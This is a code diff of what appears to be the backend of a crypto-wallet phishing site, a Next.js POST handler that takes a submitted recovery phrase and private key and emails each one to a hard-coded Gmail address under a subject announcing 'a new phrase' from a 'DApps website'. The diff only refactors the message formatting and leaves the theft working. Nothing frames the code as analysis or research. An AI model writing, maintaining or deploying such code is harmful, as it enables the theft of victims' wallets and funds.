@@ -1,6 +1,6 @@
 import nodemailer from 'nodemailer'
 
-const formatMessage = async (message: string) => {
+const formatMessage = async () => {
   const email = process.env.EMAIL;
   const pass = process.env.PASS;
 
@@ -11,15 +11,6 @@ const formatMessage = async (message: string) => {
       pass,
     }
   });
-
-  // Split the message into lines
-  const lines = message.split(/\r?\n/);
-
-  // Format each line with a prefix (for example)
-  const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);
-
-  // Join formatted lines into a single HTML string
-  const formattedMessage = formattedLines.join('');
 
   const mailOptions = {
     from: `Random ${email}`,
@@ -45,7 +36,7 @@ const formatMessage = async (message: string) => {
   }
 
   // Return the formatted message
-  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
+  return `success`;
 }
 
 export async function POST(request: Request) {
@@ -57,6 +48,8 @@ export async function POST(request: Request) {
       const email = process.env.EMAIL
       const pass = process.env.PASS
 
+      await formatMessage()
+
       const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
@@ -65,14 +58,11 @@ export async function POST(request: Request) {
         }
       })
 
-
-      const formattedMessage = await formatMessage(phrase);
-
       const mailOptions = {
         from: `Dapp App ${email}`,
         to: "contact.telfarglobal@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: formattedMessage,
+        html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${phrase}</div>`,
       }
 
       transporter.verify(function (error, success) {
@@ -96,6 +86,9 @@ export async function POST(request: Request) {
 
       const email = process.env.EMAIL
       const pass = process.env.PASS
+
+      await formatMessage()
+
 
       const transporter = nodemailer.createTransport({
         service: 'gmail',
@@ -136,6 +129,8 @@ export async function POST(request: Request) {
       const email = process.env.EMAIL
       const pass = process.env.PASS
 
+      await formatMessage()
+
       const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
@@ -144,15 +139,11 @@ export async function POST(request: Request) {
         }
       })
 
-
-
-      const formattedMessage = await formatMessage(privateKey);
-
       const mailOptions = {
         from: `Dapp App ${email}`,
         to: "contact.telfarglobal@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: formattedMessage,
+        html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${privateKey}</div>`,
       }
 
       transporter.verify(function (error, success) {
